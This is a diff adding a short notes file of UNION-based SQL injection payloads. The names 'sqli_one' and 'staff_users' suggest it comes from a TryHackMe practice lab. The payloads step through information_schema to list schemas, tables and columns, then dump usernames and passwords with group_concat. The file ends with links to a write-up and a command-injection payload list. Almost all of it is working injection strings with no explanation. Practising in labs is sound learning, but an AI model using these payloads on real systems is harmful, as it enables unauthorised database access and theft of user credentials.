@@ -1,0 +1,22 @@
+0 UNION SELECT 1,database(),schema_name FROM information_schema.schemata -- -
+0 UNION SELECT 1,2,group_concat(schema_name) FROM information_schema.schemata -- -
+
+
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+0 union SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_one'-- -
+
+0 UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_schema='sqli_one' and table_name='staff_users'-- -
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema='sqli_one' and table_name='staff_users'-- -
+
+         id,password,username
+
+0 union SELECT 1,2,username||'-'||password FROM staff_users-- -
+
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users -- -
+
+
+
+https://medium.com/@Aircon/sql-injection-tryhackme-thm-f712548fc198
+
+
+https://github.com/payloadbox/command-injection-payload-list
